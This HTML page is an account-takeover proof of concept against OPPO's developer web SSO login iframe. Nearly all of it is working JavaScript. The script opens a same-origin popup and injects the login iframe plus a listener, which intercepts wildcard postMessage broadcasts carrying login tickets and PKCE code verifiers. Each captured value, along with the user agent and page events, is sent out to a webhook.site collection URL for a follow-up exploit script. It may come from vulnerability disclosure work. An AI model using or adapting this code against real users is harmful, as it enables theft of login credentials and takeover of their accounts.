<!DOCTYPE html>
<html>
<head>
<meta charset="utf-8">
<title>OPPO ATO PoC B - click-launched popup-with-iframe</title>
<style>
 body{font-family:ui-monospace,Menlo,Consolas,monospace;background:#0b0b0b;color:#9cffb0;padding:14px;margin:0}
 h1{margin:0 0 8px;font-size:15px;color:#fff}
 #status{padding:10px;border:1px solid #333;background:#141414;margin-bottom:10px;font-weight:bold}
 #status.hit{background:#07450e;border-color:#0f0;color:#fff}
 #log{white-space:pre-wrap;border:1px solid #333;padding:8px;background:#141414;height:340px;overflow:auto;font-size:11px}
 button{background:#1976d2;color:#fff;border:0;padding:14px 22px;font-size:16px;cursor:pointer;border-radius:4px;margin-bottom:10px}
 button:hover{background:#1565c0}
</style>
</head>
<body>
<h1>OPPO ATO PoC B - popup containing same-origin iframe</h1>
<button id="go">Click to open content</button>
<div id="status">click the button to start. user-activation is required so the popup is not blocked.</div>
<pre id="log"></pre>

<script>
(function(){
  // ==================== CONFIG ====================
  var WEBHOOK = "https://webhook.site/REPLACE-ME-WITH-FRESH-UUID";

  var BASE       = "https://developers.oppomobile.com/user/web-sso/login-iframe";
  var INNER_FROM = BASE + "?fromLocation=x";
  var IFRAME_SRC = BASE + "?fromLocation=" + encodeURIComponent(INNER_FROM);
  // ================================================

  var statusEl = document.getElementById('status');
  var logEl    = document.getElementById('log');
  var seq = 0;

  function safe(v){ try{return typeof v==='string'?v:JSON.stringify(v);}catch(e){return String(v);} }
  function line(label, obj){
    seq++;
    var s = '#'+seq+' ['+new Date().toISOString()+'] '+label+'  '+safe(obj);
    logEl.textContent += s + '\n';
    logEl.scrollTop = logEl.scrollHeight;
  }
  function exfil(label, data){
    var payload = JSON.stringify({label:label, ts:new Date().toISOString(), seq:seq, data:data});
    var sent = false;
    try { if (navigator.sendBeacon) sent = navigator.sendBeacon(WEBHOOK, payload); } catch(e){}
    if (!sent) {
      try { fetch(WEBHOOK, {method:'POST', mode:'no-cors', body:payload, keepalive:true}); }
      catch(e){
        try { new Image().src = WEBHOOK + '?label='+encodeURIComponent(label)+'&data='+encodeURIComponent(safe(data)); }
        catch(e2){}
      }
    }
    line('EXFIL '+label, data);
  }

  exfil('BOOT_OPENER', {href:location.href, ua:navigator.userAgent});

  // We listen on the OPENER window for messages forwarded by the popup.
  window.addEventListener('message', function(ev){
    line('OPENER_RECV', {origin:ev.origin, data:ev.data});
    exfil('OPENER_POSTMESSAGE', {origin:ev.origin, data:ev.data});

    var d = ev.data;
    // Inner forward shape: {kind:'fwd', origin, data}
    var p = (d && d.kind === 'fwd' && d.data) ? d.data : null;
    if (!p && d && typeof d === 'object' && d.channel === 'sdk-login-status') p = d.data;
    if (p && typeof p === 'object' && p.channel === 'sdk-login-status') p = p.data;

    if (p && p.code === 'loginSuccess' && p.ticket) {
      statusEl.classList.add('hit');
      statusEl.textContent =
        'TICKET CAPTURED. Feed to ato_exploit_step2.sh:\n' +
        'ticket:       ' + p.ticket + '\n' +
        'codeVerifier: ' + p.codeVerifier;
      exfil('TICKET_CAPTURED', p);
    } else if (p && p.code === 'loginSuccess') {
      exfil('EMPTY_TICKET_NOOP', p);
    }
  }, false);

  document.getElementById('go').onclick = function(){
    statusEl.textContent = 'opening popup...';
    exfil('CLICK', {});

    // about:blank popups inherit the opener's origin (muj-taba.github.io
    // here). That gives the popup script same-origin access to the
    // opener AND it sits as `window.parent` of the iframe we inject.
    // The iframe's bridge calls window.parent.postMessage(..., "*"),
    // which our popup script receives, and we forward to the opener.
    var pop = window.open('about:blank', 'oppo_ato', 'width=900,height=700');
    if (!pop) {
      statusEl.textContent = 'popup blocked. allow popups for this site and click again.';
      exfil('POPUP_BLOCKED', {});
      return;
    }

    // Build the inner document. Note: the iframe src is built in JS to
    // avoid HTML-attribute line-break problems.
    var doc = pop.document;
    doc.open();
    doc.write('<!DOCTYPE html><html><head><meta charset="utf-8"><title>...</title></head><body></body></html>');
    doc.close();

    // Inject the iframe element programmatically into the popup.
    var ifr = doc.createElement('iframe');
    ifr.width  = '500';
    ifr.height = '620';
    ifr.style.border = '1px solid #333';
    ifr.setAttribute('sandbox', 'allow-scripts allow-same-origin allow-forms allow-popups');
    ifr.src = IFRAME_SRC;

    // Track loads so we know whether HeyTap's redirect landed back on /login-iframe.
    var loadCount = 0;
    ifr.addEventListener('load', function(){
      loadCount++;
      try { window.opener && null; } catch(e){}
      try {
        // Forward iframe load events to opener via direct webhook (popup may have been moved).
        navigator.sendBeacon(WEBHOOK, JSON.stringify({
          label:'POPUP_IFRAME_LOAD', n:loadCount, src:ifr.getAttribute('src'), ts:new Date().toISOString()
        }));
      } catch(e){}
    });

    doc.body.appendChild(ifr);

    // Inject a script INTO the popup that listens for postMessage and forwards
    // both to the opener (us) and directly to the webhook.
    var script = doc.createElement('script');
    script.textContent =
      "(function(){\n" +
      "  var WEBHOOK=" + JSON.stringify(WEBHOOK) + ";\n" +
      "  function ex(label,data){\n" +
      "    var p=JSON.stringify({label:label,ts:new Date().toISOString(),data:data});\n" +
      "    try{navigator.sendBeacon(WEBHOOK,p);}catch(e){}\n" +
      "    try{fetch(WEBHOOK,{method:'POST',mode:'no-cors',body:p,keepalive:true});}catch(e){}\n" +
      "  }\n" +
      "  ex('POPUP_BOOT',{href:location.href});\n" +
      "  window.addEventListener('message',function(ev){\n" +
      "    var rec={origin:ev.origin,dataType:typeof ev.data,data:ev.data};\n" +
      "    ex('POPUP_RECV',rec);\n" +
      "    try{ if(window.opener) window.opener.postMessage({kind:'fwd',origin:ev.origin,data:ev.data},'*'); }catch(e){}\n" +
      "  },false);\n" +
      "  window.addEventListener('pagehide',function(e){ex('POPUP_PAGEHIDE',{persisted:e.persisted,href:location.href});});\n" +
      "  window.addEventListener('beforeunload',function(){ex('POPUP_BEFOREUNLOAD',{href:location.href});});\n" +
      "  setInterval(function(){ex('POPUP_HB',{href:location.href});},5000);\n" +
      "})();";
    doc.body.appendChild(script);

    statusEl.textContent = 'popup open. SDK should run inside it. waiting for postMessage forward...';
  };
})();
</script>
</body>
</html>
